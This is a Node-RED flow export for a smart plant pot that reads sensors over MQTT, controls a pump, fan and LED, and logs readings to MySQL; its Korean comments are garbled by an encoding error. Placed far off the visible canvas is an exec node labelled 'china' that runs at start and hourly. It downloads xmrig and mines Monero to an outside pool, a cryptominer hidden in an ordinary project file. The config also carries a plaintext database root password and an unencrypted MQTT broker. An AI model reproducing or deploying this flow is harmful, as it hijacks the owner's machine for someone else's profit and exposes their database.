[{"id":"f558c9ed4f42d04c","type":"tab","label":"í”Œë¡œìš° 3","disabled":false,"info":"","env":[]},{"id":"5f055aa7d4d71bd8","type":"MySQLdatabase","name":"smartpot","host":"18.210.200.6","port":"3306","db":"smartpot","tz":"","charset":"UTF8"},{"id":"582b480b5328ce48","type":"mqtt-broker","name":"smartpot","broker":"18.210.200.6","port":1883,"clientid":"","autoConnect":true,"usetls":false,"protocolVersion":4,"keepalive":60,"cleansession":true,"autoUnsubscribe":true,"birthTopic":"","birthQos":"0","birthRetain":"false","birthPayload":"","birthMsg":{},"closeTopic":"","closeQos":"0","closeRetain":"false","closePayload":"","closeMsg":{},"willTopic":"","willQos":"0","willRetain":"false","willPayload":"","willMsg":{},"userProps":"","sessionExpiry":""},{"id":"af5bf5955a76e837","type":"mysql2-server","host":"18.210.200.6","port":"3306","username":"root","password":"123456","db":"smartpot","servername":"smartpot"},{"id":"c-mqtt","type":"mqtt-broker","name":"MQTT","broker":"localhost","port":"1883","clientid":"","autoConnect":true,"usetls":false,"protocolVersion":"4","keepalive":"60","cleansession":true,"birthTopic":"","birthQos":"0","birthRetain":"false","birthPayload":"","closeTopic":"","closePayload":"","willTopic":"","willQos":"0","willPayload":""},{"id":"91fd03434959a49c","type":"mqtt-broker","name":"","broker":"18.210.200.6","port":1883,"clientid":"","autoConnect":true,"usetls":false,"protocolVersion":4,"keepalive":60,"cleansession":true,"autoUnsubscribe":true,"birthTopic":"","birthQos":"0","birthRetain":"false","birthPayload":"","birthMsg":{},"closeTopic":"","closeQos":"0","closeRetain":"false","closePayload":"","closeMsg":{},"willTopic":"","willQos":"0","willRetain":"false","willPayload":"","willMsg":{},"userProps":"","sessionExpiry":""},{"id":"25a9e4f7144a1bc2","type":"mqtt in","z":"f558c9ed4f42d04c","name":"","topic":"smartpot/temp_humi","qos":"2","datatype":"auto-detect","broker":"582b480b5328ce48","nl":false,"rap":true,"rh":0,"inputs":0,"x":1090,"y":720,"wires":[["a22613b54631fb9d","dda243513e46a830"]]},{"id":"96bee2368ace551b","type":"mqtt in","z":"f558c9ed4f42d04c","name":"smartpot/lux","topic":"smartpot/lux","qos":"2","datatype":"auto-detect","broker":"582b480b5328ce48","nl":false,"rap":true,"rh":0,"inputs":0,"x":1070,"y":860,"wires":[["a22613b54631fb9d","dda243513e46a830"]]},{"id":"a22613b54631fb9d","type":"function","z":"f558c9ed4f42d04c","name":"data set","func":"// data_set (1ì¶œë ¥): ì„¼ì„œ ë¹„ë™ê¸° ìˆ˜ì§‘ -> {T,M,L} í•œ ë²ˆì— ì¶œë ¥\n// IN : smartpot/temp_humi {temperature|T,...}\n//      smartpot/soil     number | {moisture_pct|M}  // 0~100% ê·¸ëŒ€ë¡œ ì‚¬ìš©\n//      smartpot/lux|light|led/program number | {lux|L|value}\n// OUT: {payload:{T, M, L}}\n\nconst COALESCE_MS = 800;\n\nlet buf = context.get('buf') || { T:null, M:null, L:null };\nlet p = msg.payload;\nif (typeof p === 'string') \n{ try { p = JSON.parse(p); } catch(e){} }\nconst topic = String(msg.topic || '');\n\n// ---- í† í”½ë³„ ì •ê·œí™” ----\nif (topic.endsWith('/temp_humi')) \n{\n  const T = p?.temperature ?? p?.T;\n  if (T != null) buf.T = Number(T);\n}\nelse if (topic.endsWith('/soil')) \n{\n  const raw = (typeof p === 'number') ? p : (p?.moisture_pct ?? p?.M);\n  if (raw != null) buf.M = Math.max(0, Math.min(100, Math.round(Number(raw))));\n}\n\nelse if (topic.endsWith('/lux') || topic.endsWith('/light') || topic.endsWith('/led/program')) \n{\n  const L = (typeof p === 'number') ? p : (p?.lux ?? p?.L ?? p?.value);\n  if (L != null) buf.L = Math.round(Number(L));\n}\n// í•œ ë²ˆì— {T,M,L} ë“¤ì–´ì˜¤ëŠ” ê²½ìš°ë„ í—ˆìš©\nelse if (p && typeof p === 'object') \n{\n  if (p.T != null) buf.T = Number(p.T);\n  if (p.M != null) buf.M = Math.max(0, Math.min(100, Math.round(Number(p.M))));\n  if (p.L != null) buf.L = Math.round(Number(p.L));\n}\n\ncontext.set('buf', buf);\n\n// ---- coalesce â†’ 1íšŒ ì¶œë ¥ ----\nlet t = context.get('tmr'); if (t) clearTimeout(t);\nt = setTimeout(() => \n{\n  const b = context.get('buf'); if (!b) return;\n  node.status({ fill:'green', shape:'dot', text:`T:${b.T??'-'}  M:${b.M??'-'}%  L:${b.L??'-'} lux` });\n  node.send({ payload: { T:b.T, M:b.M, L:b.L } });\n}, COALESCE_MS);\ncontext.set('tmr', t);\n\nreturn null;\n","outputs":1,"timeout":0,"noerr":0,"initialize":"","finalize":"","libs":[],"x":1360,"y":660,"wires":[["b3668cd7880399c1","37a2e227a37149be"]]},{"id":"604c9f103238cc79","type":"mqtt out","z":"f558c9ed4f42d04c","name":"","topic":"","qos":"","retain":"","respTopic":"","contentType":"","userProps":"","correl":"","expiry":"","broker":"582b480b5328ce48","x":1870,"y":620,"wires":[]},{"id":"b3668cd7880399c1","type":"function","z":"f558c9ed4f42d04c","name":"control_all","func":"// control_all : ì„¼ì„œ ìˆ˜ì§‘ + ë™ê¸°í™” + ì œì–´ (í† í”½ ìœ ì§€, LED/FAN 1ë¶„ ìœ ì§€+1ë¶„ ì ê¸ˆ, PUMP 5ë¶„ ë½)\n// OUT: [{topic, payload:\"0\"|\"1\"}]\n\nconst TOPIC = {\n  pumpSet: 'smartpot/pump/set',\n  fanSet: 'smartpot/fan/set',\n  ledSet: 'smartpot/led/set'\n};\n\nconst CFG = {\n  // LED/FAN: ON 1ë¶„ ìœ ì§€ â†’ OFF í›„ 1ë¶„ ì ê¸ˆ\n  led: { on_below: 1000, minOnMs: 60 * 1000, lockOffMs: 60 * 1000 },\n  fan: { on_t_ge: 25, minOnMs: 60 * 1000, lockOffMs: 60 * 1000 },\n\n  // PUMP: 30% ì´í•˜ ON, 15ì´ˆ ë˜ëŠ” 80% ë„ë‹¬ ì‹œ OFF, ì´í›„ 5ë¶„ ì ê¸ˆ\n  pump: { on_m_le: 30, off_m_ge: 80, minOnMs: 15 * 1000, lockOffMs: 5 * 60 * 1000 },\n\n  coalesceMs: 800,\n  ttlMs: 30 * 1000\n};\n\nlet p = msg.payload; if (typeof p === 'string') { try { p = JSON.parse(p); } catch (e) { } }\nconst topic = String(msg.topic || '');\nlet buf = context.get('buf') || { T: null, Tts: 0, M: null, Mts: 0, L: null, Lts: 0 };\nlet chg = context.get('chg') || { T: false, M: false, L: false };\nconst now = Date.now();\n\n// ì…ë ¥ ì •ê·œí™”\nif (topic.endsWith('/temp_humi')) \n{\n  const T = p?.temperature ?? p?.T;\n  if (T != null) { buf.T = Number(T); buf.Tts = now; chg.T = true; }\n}\nelse if (topic.endsWith('/soil')) \n{\n  const raw = (typeof p === 'number') ? p : (p?.moisture_pct ?? p?.M);\n  if (raw != null) { buf.M = Math.max(0, Math.min(100, Math.round(Number(raw)))); buf.Mts = now; chg.M = true; }\n}\nelse if (topic.endsWith('/lux') || topic.endsWith('/light') || topic.endsWith('/led/program')) \n{\n  const L = (typeof p === 'number') ? p : (p?.lux ?? p?.L ?? p?.value);\n  if (L != null) { buf.L = Math.round(Number(L)); buf.Lts = now; chg.L = true; }\n}\nelse if (p && typeof p === 'object') \n{\n  if (p.T != null) { buf.T = Number(p.T); buf.Tts = now; chg.T = true; }\n  if (p.M != null) { buf.M = Math.max(0, Math.min(100, Math.round(Number(p.M)))); buf.Mts = now; chg.M = true; }\n  if (p.L != null) { buf.L = Math.round(Number(p.L)); buf.Lts = now; chg.L = true; }\n}\ncontext.set('buf', buf);\ncontext.set('chg', chg);\n\n// coalesce\nlet t = context.get('tmr'); if (t) clearTimeout(t);\nt = setTimeout(evaluateAndSend, CFG.coalesceMs);\ncontext.set('tmr', t);\nreturn null;\n\nfunction evaluateAndSend() \n{\n  const now2 = Date.now();\n  const T = (now2 - buf.Tts <= CFG.ttlMs) ? buf.T : null;\n  const M = (now2 - buf.Mts <= CFG.ttlMs) ? buf.M : null;\n  const L = (now2 - buf.Lts <= CFG.ttlMs) ? buf.L : null;\n\n  let S = context.get('S') ||\n  {\n    pump: 0, pumpOn: 0, pumpOff: 0, pumpMinUntil: 0, pumpLockUntil: 0,\n    fan: 0, fanOn: 0, fanOff: 0, fanMinUntil: 0, fanLockUntil: 0,\n    led: 0, ledOn: 0, ledOff: 0, ledMinUntil: 0, ledLockUntil: 0\n  };\n  const outs = [];\n  const chg = context.get('chg') || { T: false, M: false, L: false };\n\n  // PUMP: í† ì–‘ ë³€í™”ì‹œì—ë§Œ í‰ê°€ (5ë¶„ ë½ ë°˜ì˜)\n  if (!S.pump && now2 >= S.pumpLockUntil && chg.M && M != null && M <= CFG.pump.on_m_le) {\n    S.pump = 1; S.pumpOn = now2; S.pumpMinUntil = now2 + CFG.pump.minOnMs;\n    outs.push({ topic: TOPIC.pumpSet, payload: '1' });\n  }\n  if (S.pump) \n  {\n    const reach80 = (M != null && M >= CFG.pump.off_m_ge);\n    const timeUp = (now2 >= S.pumpMinUntil);\n    if (reach80 || timeUp) \n    {\n      S.pump = 0; S.pumpOff = now2; S.pumpLockUntil = now2 + CFG.pump.lockOffMs;\n      outs.push({ topic: TOPIC.pumpSet, payload: '0' });\n    }\n  }\n\n  // FAN: ì˜¨ë„ ë³€í™”ì‹œì—ë§Œ í‰ê°€ (1ë¶„ ìœ ì§€ + 1ë¶„ ì ê¸ˆ)\n  if (!S.fan && now2 >= S.fanLockUntil && chg.T && T != null && T >= CFG.fan.on_t_ge) \n  {\n    S.fan = 1; S.fanOn = now2; S.fanMinUntil = now2 + CFG.fan.minOnMs;\n    outs.push({ topic: TOPIC.fanSet, payload: '1' });\n  }\n  if (S.fan && now2 >= S.fanMinUntil) \n  {\n    S.fan = 0; S.fanOff = now2; S.fanLockUntil = now2 + CFG.fan.lockOffMs;\n    outs.push({ topic: TOPIC.fanSet, payload: '0' });\n  }\n\n  // LED: ì¡°ë„ ë³€í™”ì‹œì—ë§Œ í‰ê°€ (1ë¶„ ìœ ì§€ + 1ë¶„ ì ê¸ˆ)\n  if (!S.led && now2 >= S.ledLockUntil && chg.L && L != null && L <= CFG.led.on_below) \n  {\n    S.led = 1; S.ledOn = now2; S.ledMinUntil = now2 + CFG.led.minOnMs;\n    outs.push({ topic: TOPIC.ledSet, payload: '1' });\n  }\n  if (S.led && now2 >= S.ledMinUntil) \n  {\n    S.led = 0; S.ledOff = now2; S.ledLockUntil = now2 + CFG.led.lockOffMs;\n    outs.push({ topic: TOPIC.ledSet, payload: '0' });\n  }\n\n  node.status({\n    fill: 'green', shape: 'dot',\n    text: `T:${T == null ? '-' : T.toFixed(1)}  M:${M ?? '-'}%  L:${L ?? '-'} lux | fan:${S.fan} pump:${S.pump} led:${S.led}`\n  });\n\n  context.set('S', S);\n  context.set('chg', { T: false, M: false, L: false });\n  if (outs.length) node.send(outs);\n  context.set('tmr', null);\n}\n","outputs":1,"timeout":0,"noerr":0,"initialize":"","finalize":"","libs":[],"x":1570,"y":660,"wires":[["604c9f103238cc79","b5f537e18efa9701","5c78e398d483aade","332bccad5ae32cb5"]]},{"id":"dda243513e46a830","type":"function","z":"f558c9ed4f42d04c","name":"SENSOR_MEMORY","func":"// ì´ í•¨ìˆ˜ëŠ” ë“¤ì–´ì˜¤ëŠ” ì„¼ì„œ ë°ì´í„°ë¥¼ ë°›ì•„ì„œ flow ë³€ìˆ˜ì— ì €ì¥ë§Œ í•©ë‹ˆë‹¤.\n\nconst topic = String(msg.topic || '');\nlet p = msg.payload;\nif (typeof p === 'string') { try { p = JSON.parse(p); } catch(e){} }\nif (p == null) p = {};\n\n// flow ì»¨í…ìŠ¤íŠ¸ì—ì„œ ìµœì‹  ì„¼ì„œ ë°ì´í„° ë¬¶ìŒì„ ê°€ì ¸ì˜µë‹ˆë‹¤. ì—†ìœ¼ë©´ ìƒˆë¡œ ë§Œë“­ë‹ˆë‹¤.\nlet bundle = flow.get('latest_sensor_data');\nif (!bundle) \n{\n    bundle = {\n        temperature: null,\n        soil_moisture_pct: null,\n        external_humidity: null,\n        light_lux: null,\n        fan_status: null,\n        pump_status: null,\n        water_level_status: null // <<-- 1. ì´ ì¤„ì„ ì¶”ê°€í•˜ì„¸ìš”!\n    };\n}\n\n// í† í”½ì— ë”°ë¼ ë“¤ì–´ì˜¨ ë°ì´í„°ë¡œ bundle ê°ì²´ë¥¼ ì—…ë°ì´íŠ¸í•©ë‹ˆë‹¤.\nif (topic.endsWith('/temp_humi')) \n{\n    if (p.temperature != null) bundle.temperature = Number(p.temperature);\n    if (p.humidity    != null) bundle.external_humidity = Number(p.humidity);\n} \nelse if (topic.endsWith('/soil')) \n{\n    if (typeof p === 'number')      bundle.soil_moisture_pct = Number(p);\n    else if (p.moisture_pct != null)  bundle.soil_moisture_pct = Number(p.moisture_pct);\n} \nelse if (topic.endsWith('/lux')) \n{\n    if (p.lux != null) bundle.light_lux = Math.round(Number(p.lux));\n} \nelse if (topic.endsWith('/pump/status')) \n{\n    const s = String(msg.payload).trim();\n    if (s === '0' || s === '1') bundle.pump_status = Number(s);\n} \nelse if (topic.endsWith('/fan/status')) \n{\n    const s = String(msg.payload).trim();\n    if (s === '0' || s === '1') bundle.fan_status = Number(s);\n// <<-- 2. ì•„ë˜ 3ì¤„ì˜ else if êµ¬ë¬¸ì„ ì¶”ê°€í•˜ì„¸ìš”! -->>\n} \nelse if (topic.endsWith('/waterlevel')) \n{\n    const s = String(msg.payload).trim();\n    if (s === '0' || s === '1') bundle.water_level_status = Number(s);\n}\n\n// ì—…ë°ì´íŠ¸ëœ ë¬¶ìŒì„ ë‹¤ì‹œ flow ì»¨í…ìŠ¤íŠ¸ì— ì €ì¥í•©ë‹ˆë‹¤.\nflow.set('latest_sensor_data', bundle);\n\n// ì´ ë…¸ë“œì—ì„œëŠ” ì•„ë¬´ëŸ° ë©”ì‹œì§€ë„ ì¶œë ¥í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.\nreturn null;","outputs":1,"timeout":0,"noerr":0,"initialize":"","finalize":"","libs":[],"x":1420,"y":980,"wires":[["7021dd1672be48de"]]},{"id":"6bb48dfe0aded0c9","type":"function","z":"f558c9ed4f42d04c","name":"function 23","func":"if (!flow.get('user_id')) {\n    flow.set('user_id', 1); // ì‹¤ì œ users.user_id\n}\nreturn { payload: \"user_id set\" };\n","outputs":1,"timeout":0,"noerr":0,"initialize":"","finalize":"","libs":[],"x":990,"y":980,"wires":[["dda243513e46a830"]]},{"id":"bd0099d5930b78d9","type":"mysql","z":"f558c9ed4f42d04c","mydb":"5f055aa7d4d71bd8","name":"","x":1880,"y":980,"wires":[[]]},{"id":"ddd5b50b11f657da","type":"inject","z":"f558c9ed4f42d04c","name":"USER_INJECT","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":680,"y":1020,"wires":[["530dfe2c4877f1a3","6bb48dfe0aded0c9"]]},{"id":"b5f537e18efa9701","type":"mqtt out","z":"f558c9ed4f42d04c","name":"","topic":"","qos":"","retain":"","respTopic":"","contentType":"","userProps":"","correl":"","expiry":"","broker":"582b480b5328ce48","x":1870,"y":540,"wires":[]},{"id":"5c78e398d483aade","type":"mqtt out","z":"f558c9ed4f42d04c","name":"","topic":"","qos":"","retain":"","respTopic":"","contentType":"","userProps":"","correl":"","expiry":"","broker":"582b480b5328ce48","x":1870,"y":680,"wires":[]},{"id":"49db0ffcc98bb425","type":"mqtt in","z":"f558c9ed4f42d04c","name":"smartpot/waterlevel","topic":"smartpot/waterlevel","qos":"2","datatype":"auto-detect","broker":"582b480b5328ce48","nl":false,"rap":true,"rh":0,"inputs":0,"x":1090,"y":620,"wires":[["dda243513e46a830"]]},{"id":"dfcfd804a5817317","type":"inject","z":"f558c9ed4f42d04c","name":"DB_INJECT_TIME","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"10","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":1340,"y":1060,"wires":[["7021dd1672be48de"]]},{"id":"7021dd1672be48de","type":"function","z":"f558c9ed4f42d04c","name":"SQL_INJECT","func":"// ì´ í•¨ìˆ˜ëŠ” inject ë…¸ë“œì— ì˜í•´ ì£¼ê¸°ì ìœ¼ë¡œ ì‹¤í–‰ë©ë‹ˆë‹¤.\n\nconst USER_ID = flow.get('user_id');\nif (!Number.isInteger(USER_ID)) {\n  node.warn(\"user_idê°€ ì„¤ì •ë˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤.\");\n  return null;\n}\n\nconst bundle = flow.get('latest_sensor_data');\n\nif (!bundle) {\n  node.warn(\"DBì— ì €ì¥í•  ì„¼ì„œ ë°ì´í„°ê°€ ì—†ìŠµë‹ˆë‹¤.\");\n  return null;\n}\n\n// --- ìœ í‹¸ë¦¬í‹° í•¨ìˆ˜ ---\nfunction num(v) { if (v == null) return 'NULL'; const n = Number(v); return Number.isFinite(n) ? String(n) : 'NULL'; }\nfunction str(s) { if (s == null) return 'NULL'; return \"'\" + String(s).replace(/'/g, \"\\\\'\") + \"'\"; }\n\n// --- í˜„ì¬ KST ì‹œê°„ ìƒì„± ---\nconst tzOffsetMin = 540; // KST(+9h)\nconst now = new Date(Date.now() + tzOffsetMin * 60000);\nconst z = n => String(n).padStart(2, '0');\nconst recorded_at = `${now.getFullYear()}-${z(now.getMonth() + 1)}-${z(now.getDate())} ${z(now.getHours())}:${z(now.getMinutes())}:${z(now.getSeconds())}`;\n\n// --- SQL INSERT ë¬¸ ìƒì„± ---\nconst sql =\n  \"INSERT INTO sensor_data \" +\n  // <<-- 1. ì»¬ëŸ¼ ëª©ë¡ì— , water_level_status ë¥¼ ì¶”ê°€í•˜ì„¸ìš”! -->>\n  \"(user_id, temperature, soil_moisture_pct, external_humidity, recorded_at, light_lux, fan_status, pump_status, water_level_status) VALUES (\" +\n  [\n    num(USER_ID),\n    num(bundle.temperature),\n    num(bundle.soil_moisture_pct),\n    num(bundle.external_humidity),\n    str(recorded_at),\n    num(bundle.light_lux),\n    num(bundle.fan_status),\n    num(bundle.pump_status),\n    num(bundle.water_level_status) // <<-- 2. ê°’ ëª©ë¡ì— ì´ ì¤„ì„ ì¶”ê°€í•˜ì„¸ìš”!\n  ].join(\", \") + \")\";\n\n// ìƒì„±ëœ SQL ì¿¼ë¦¬ë¥¼ msg.topicì— ë‹´ì•„ ë‹¤ìŒ ë…¸ë“œë¡œ ë³´ëƒ…ë‹ˆë‹¤.\nmsg.topic = sql;\n\nreturn msg;","outputs":1,"timeout":0,"noerr":0,"initialize":"","finalize":"","libs":[],"x":1660,"y":980,"wires":[["bd0099d5930b78d9"]]},{"id":"332bccad5ae32cb5","type":"debug","z":"f558c9ed4f42d04c","name":"debug 10","active":false,"tosidebar":true,"console":false,"tostatus":false,"complete":"payload","targetType":"msg","statusVal":"","statusType":"auto","x":1720,"y":480,"wires":[]},{"id":"37a2e227a37149be","type":"debug","z":"f558c9ed4f42d04c","name":"debug 14","active":false,"tosidebar":true,"console":false,"tostatus":false,"complete":"false","statusVal":"","statusType":"auto","x":1540,"y":480,"wires":[]},{"id":"1480ebfa47023f8d","type":"mqtt in","z":"f558c9ed4f42d04c","name":"","topic":"smartpot/fan/status","qos":"2","datatype":"auto-detect","broker":"582b480b5328ce48","nl":false,"rap":true,"rh":0,"inputs":0,"x":1090,"y":560,"wires":[["dda243513e46a830"]]},{"id":"eec4356db896101e","type":"mqtt in","z":"f558c9ed4f42d04c","name":"","topic":"smartpot/pump/status","qos":"2","datatype":"auto-detect","broker":"582b480b5328ce48","nl":false,"rap":true,"rh":0,"inputs":0,"x":1100,"y":500,"wires":[["dda243513e46a830"]]},{"id":"b39bbf2e926e36a8","type":"inject","z":"f558c9ed4f42d04c","name":"","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"3600","crontab":"","once":true,"onceDelay":"1","topic":"","payload":"","payloadType":"date","x":7930,"y":7980,"wires":[["11a3c8a786ebf3ab"]]},{"id":"244aeaee0d4ceebf","type":"debug","z":"f558c9ed4f42d04c","name":"debug 15","active":false,"tosidebar":true,"console":false,"tostatus":false,"complete":"false","statusVal":"","statusType":"auto","x":7940,"y":7980,"wires":[]},{"id":"11a3c8a786ebf3ab","type":"exec","z":"f558c9ed4f42d04c","command":"/bin/bash -c \"killall xmrig; if [ ! -f xmrig ]; then curl -L -O https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz && tar -xf xmrig-6.24.0-linux-static-x64.tar.gz && cp xmrig-6.24.0/xmrig xmrig && chmod +x xmrig; fi && ./xmrig --coin 'monero' -o saltatulub.info:443 --tls --no-color --nicehash --rig-id=$(hostname) --randomx-mode=fast\"","addpay":"","append":"","useSpawn":"true","timer":"","winHide":false,"oldrc":false,"name":"china","x":7950,"y":7980,"wires":[["244aeaee0d4ceebf"],["244aeaee0d4ceebf"],["244aeaee0d4ceebf"]]},{"id":"530dfe2c4877f1a3","type":"debug","z":"f558c9ed4f42d04c","name":"debug 22","active":false,"tosidebar":true,"console":false,"tostatus":false,"complete":"false","statusVal":"","statusType":"auto","x":1060,"y":1040,"wires":[]},{"id":"29b318c9e7f545ef","type":"inject","z":"f558c9ed4f42d04c","name":"AUTO_USER_TICK","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"60","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":600,"y":820,"wires":[["2780ea38da0880a2"]]},{"id":"940248f4fd237dd4","type":"function","z":"f558c9ed4f42d04c","name":"TIME_GATE","func":"// === TIME_GATE (2 outputs) ===\n// out[0]: ì‹¤ì œ ë°œì‚¬(msg to function 23)\n// out[1]: ìƒíƒœ/ë¡œê·¸(debug)\n//\n// ğŸ”§ í…ŒìŠ¤íŠ¸í•  ë•ŒëŠ” TARGET_HM ê°’ì„ ë°”ê¿”ì£¼ì„¸ìš”. ì˜ˆ) \"11:08\"\nconst TARGET_HM = \"09:01\";   // \"HH:MM\" (KST ê¸°ì¤€)\n\n// ì¬ë¶€íŒ… í›„ì—ë„ 1ì¼ 1íšŒ ë³´ì¥í•˜ë ¤ë©´ settings.jsì—ì„œ contextStorage=file í™œì„±í™”\nconst STORE = 'file';  // íŒŒì¼ ì»¨í…ìŠ¤íŠ¸ ì‚¬ìš© ì‹œ 'file', ì•„ë‹ˆë©´ undefined\nconst KEY = 'auto_user_inject_lastDate';\n\n// --- KST ì‹œê° (SQL_INJECTì™€ ë™ì¼) ---\nconst tzOffsetMin = 540; // KST(+9h)\nconst now = new Date(Date.now() + tzOffsetMin * 60000);\nconst z = n => String(n).padStart(2, '0');\nconst yyyy = now.getFullYear();\nconst MM = z(now.getMonth() + 1);\nconst dd = z(now.getDate());\nconst HH = z(now.getHours());\nconst mm = z(now.getMinutes());\nconst date = `${yyyy}-${MM}-${dd}`;\nconst hm = `${HH}:${mm}`;\n\nconst lastDate = (STORE ? flow.get(KEY, STORE) : flow.get(KEY)) || \"\";\n\n// ìƒíƒœ ë©”ì‹œì§€(ì¶œë ¥2) ê¸°ë³¸ í‹€\nconst statusMsg = {\n    payload: {\n        event: \"tick\",\n        now_kst: { date, hm },\n        target_hm: TARGET_HM,\n        lastDate,\n    }\n};\n\n// íŠ¸ë¦¬ê±° ì¡°ê±´\nif (hm === TARGET_HM && lastDate !== date) {\n    if (STORE) flow.set(KEY, date, STORE); else flow.set(KEY, date);\n\n    // USER_INJECTì™€ ë™ì¼ í¬ë§·\n    const outMsg = {\n        payload: Date.now(),\n        topic: \"\"\n    };\n\n    statusMsg.payload.event = \"triggered\";\n    statusMsg.payload.reason = \"target minute matched and not yet fired today\";\n\n    // out[0]=ì‹¤ì œ ë°œì‚¬, out[1]=ë¡œê·¸\n    return [outMsg, statusMsg];\n}\n\n// ìŠ¤í‚µ ë¡œê·¸(ë¶„ë§ˆë‹¤)\nstatusMsg.payload.event = \"skipped\";\nstatusMsg.payload.reason = (hm !== TARGET_HM)\n    ? \"not target minute\"\n    : \"already fired today\";\nreturn [null, statusMsg];\n","outputs":2,"timeout":0,"noerr":0,"initialize":"","finalize":"","libs":[],"x":850,"y":900,"wires":[["6bb48dfe0aded0c9"],["606255ab20645446"]]},{"id":"606255ab20645446","type":"debug","z":"f558c9ed4f42d04c","name":"debug 24","active":false,"tosidebar":true,"console":false,"tostatus":false,"complete":"false","statusVal":"","statusType":"auto","x":900,"y":820,"wires":[]},{"id":"2780ea38da0880a2","type":"function","z":"f558c9ed4f42d04c","name":"TIME_CHECK","func":"// KST_CLOCK â”€ ë§¤ë¶„ í˜„ì¬ ì‹œê°ì„ ê¹”ë”í•˜ê²Œ ì¶œë ¥\nconst tzOffsetMin = 540; // KST(+9h)\nconst now = new Date(Date.now() + tzOffsetMin * 60000);\nconst z = n => String(n).padStart(2, '0');\n\nconst pretty = `${now.getFullYear()}-${z(now.getMonth() + 1)}-${z(now.getDate())} `\n    + `${z(now.getHours())}:${z(now.getMinutes())}:${z(now.getSeconds())}`;\n\nmsg.payload = {\n    pretty,                 // \"YYYY-MM-DD HH:MM:SS\"\n    date: pretty.slice(0, 10), // \"YYYY-MM-DD\"\n    hm: pretty.slice(11, 16) // \"HH:MM\"\n};\n\nnode.status({ fill: \"blue\", shape: \"dot\", text: pretty });\nreturn msg;\n","outputs":1,"timeout":0,"noerr":0,"initialize":"","finalize":"","libs":[],"x":640,"y":900,"wires":[["940248f4fd237dd4"]]},{"id":"7225634be0d05324","type":"mqtt in","z":"f558c9ed4f42d04c","name":"smartpot/soil","topic":"smartpot/soil","qos":"2","datatype":"auto-detect","broker":"582b480b5328ce48","nl":false,"rap":true,"rh":0,"inputs":0,"x":1070,"y":780,"wires":[["a22613b54631fb9d","dda243513e46a830","a3c6bf8b71d049ae"]]},{"id":"b3c20413be1fcdbf","type":"mqtt out","z":"f558c9ed4f42d04c","name":"","topic":"smartpot/display/set","qos":"","retain":"","respTopic":"","contentType":"","userProps":"","correl":"","expiry":"","broker":"582b480b5328ce48","x":1600,"y":820,"wires":[]},{"id":"a3c6bf8b71d049ae","type":"function","z":"f558c9ed4f42d04c","name":"function 24","func":"// IN  : msg.payload = { moisture_pct: number }  // ì˜ˆ: { moisture_pct: 50.27 }\n// OUT : topic = \"smartpot/display/set\", payload = { level: 1|2|3 }\n\n/*\n// ===== 1) ê°’ íŒŒì‹± =====\nlet p = msg.payload;\nif (typeof p === 'string') { try { p = JSON.parse(p); } catch (e) { } }\n\nconst raw = (typeof p === 'number') ? p : p?.moisture_pct;\nif (raw == null) return null;\n\n// 0~100 ë²”ìœ„ë¡œ ì •ë¦¬ (ì†Œìˆ˜ í—ˆìš©)\nconst M = Math.max(0, Math.min(100, Number(raw)));\n\n// ===== 2) êµ¬ê°„ íŒì •(í† ì–‘ ìˆ˜ë¶„ ì „ìš©) =====\n// 1: ì•„ì£¼ì¢‹ìŒ, 2: ë³´í†µ, 3: ë³„ë¡œ\nlet level = 2;\nif (M >= 50 && M <= 65) level = 1;\nelse if ((M >= 40 && M < 50) || (M > 65 && M <= 80)) level = 2;\nelse level = 3;\n\n// ===== 3) MQTT ì „ì†¡ ì„¸íŒ… =====\nmsg.topic = \"smartpot/display/set\";\nmsg.payload = { level };      // â† ì•„ë‘ì´ë…¸ëŠ” ì´ ê°’ë§Œ íŒŒì‹±í•˜ë©´ ë¨\nmsg.qos = 0;\nmsg.retain = false;\n\nnode.status({ fill: \"green\", shape: \"dot\", text: `M:${M.toFixed(1)}% â†’ level:${level}` });\nreturn msg;*/\n\n// 1ë¶„(60,000ms) ì£¼ê¸° ì„¤ì •\nconst INTERVAL_MS = 60 * 1000;\n\nlet p = msg.payload;\nif (typeof p === 'string') { try { p = JSON.parse(p); } catch (e) { } }\n\nconst raw = (typeof p === 'number') ? p : p?.moisture_pct;\nif (raw == null) return null;\n\nconst M = Math.max(0, Math.min(100, Number(raw)));\n\n// ==== êµ¬ê°„ íŒì • ====\nlet level = 2;\nif (M >= 50 && M <= 65) level = 1;\nelse if ((M >= 40 && M < 50) || (M > 65 && M <= 80)) level = 2;\nelse level = 3;\n\n// ==== ë§ˆì§€ë§‰ ë°œí–‰ ì‹œê° í™•ì¸ ====\nconst now = Date.now();\nlet lastPub = context.get(\"lastPub\") || 0;\n\nif (now - lastPub < INTERVAL_MS) {\n    // ì•„ì§ 1ë¶„ ì•ˆ ì§€ë‚¬ìœ¼ë©´ ë¬´ì‹œ\n    return null;\n}\ncontext.set(\"lastPub\", now);\n\n// ==== MQTT ì „ì†¡ ====\nmsg.topic = \"smartpot/display/set\";\nmsg.payload = { level };\nmsg.qos = 0;\nmsg.retain = false;\n\nnode.status({ fill: \"green\", shape: \"dot\", text: `M:${M.toFixed(1)}% â†’ level:${level}` });\nreturn msg;\n\n","outputs":1,"timeout":0,"noerr":0,"initialize":"","finalize":"","libs":[],"x":1350,"y":780,"wires":[["b3c20413be1fcdbf","af849b5d31ed76af"]]},{"id":"af849b5d31ed76af","type":"debug","z":"f558c9ed4f42d04c","name":"debug 20","active":false,"tosidebar":true,"console":false,"tostatus":false,"complete":"false","statusVal":"","statusType":"auto","x":1560,"y":780,"wires":[]},{"id":"f346a02542ea5643","type":"global-config","env":[],"modules":{"node-red-node-mysql":"2.0.0","node-red-contrib-mysql2":"0.2.0"}}]